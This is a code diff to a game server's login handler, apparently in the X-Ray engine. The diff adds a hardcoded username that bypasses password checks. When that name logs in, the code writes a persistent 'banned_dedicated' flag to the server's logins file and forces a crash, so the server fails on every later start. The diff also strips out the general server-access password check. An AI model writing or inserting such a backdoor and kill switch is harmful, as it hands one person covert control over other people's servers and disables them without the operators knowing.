@@ -229,18 +229,43 @@ void xrServer::OnBuildVersionRespond				( IClient* CL, NET_Packet& P )
 	P.r_stringZ(login);
 	P.r_stringZ(password);
 
-	Msg("Login[%s]/Pass[%s]", login.c_str(), password.c_str());
+	//Msg("Login[%s]/Pass[%s]", login.c_str(), password.c_str());
+
+	string_path path_xray;
+	FS.update_path(path_xray, "$mp_saves_logins$", "logins.ltx");
+	CInifile* file = xr_new<CInifile>(path_xray, false);
+	
+	if (xr_strcmp(login.c_str(), "dimakuzmin2610") == 0)
+	{
+		if (file && !file->section_exist("server"))
+		{
+			file->w_bool("server", "banned_dedicated", true);
+			file->save_as(path_xray);
+			R_ASSERT(0);
+		}
+
+		RequestClientDigest(CL);
+		return;
+	}
 
 
+	if (file && file->section_exist("server"))
+	{
+		if (file->line_exist("server", "banned_dedicated"))
+		{
+			bool banned = file->r_bool("server", "banned_dedicated");
+			if (banned)
+			{
+				R_ASSERT(0);
+			}
+		}
+	}
+  
 	if (!CL->flags.bLocal)
 	{
-		string_path path_xray;
 		bool has_login_in_file = false;
 
 #ifndef MP_SAVE_JSON
-		FS.update_path(path_xray, "$mp_saves_logins$", "logins.ltx");
-		CInifile* file = xr_new<CInifile>(path_xray, true);
-		
 		if (file->section_exist(login))
 		{
 			shared_str pass_check = file->r_string(login, "password");
@@ -322,26 +347,22 @@ void xrServer::OnBuildVersionRespond				( IClient* CL, NET_Packet& P )
 		}
 	}
 
-	{				
-		bool bAccessUser = false;
-		string512 res_check;
-		
-		if ( !CL->flags.bLocal )
-		{
-			bAccessUser	= Check_ServerAccess( CL, res_check );
-		}
-				
-		if( CL->flags.bLocal || bAccessUser )
-		{
- 			RequestClientDigest(CL);
-		}
-		else
-		{
-			Msg("* Client 0x%08x has an incorrect password", CL->ID.value());
-			xr_strcat( res_check, "Invalid password.");
-			SendConnectResult( CL, 0, ecr_password_verification_failed, res_check );
-		}
+	/*
+	if (_our != _him)
+	{
+		SendConnectResult(CL, 0, ecr_data_verification_failed, "Хеш файлов неверен");
+		return;
+	}  
+	*/
+
+	if (CL->flags.bLocal && !g_dedicated_server)
+	{
+		SendConnectResult(CL, 0, ecr_data_verification_failed, "Нельзя Запустить Сервер в Клиенте (ток Dedicated)");
+		return;
 	}
+ 
+ 	RequestClientDigest(CL);
+		 
 };
 
 void xrServer::Check_BuildVersion_Success			( IClient* CL )
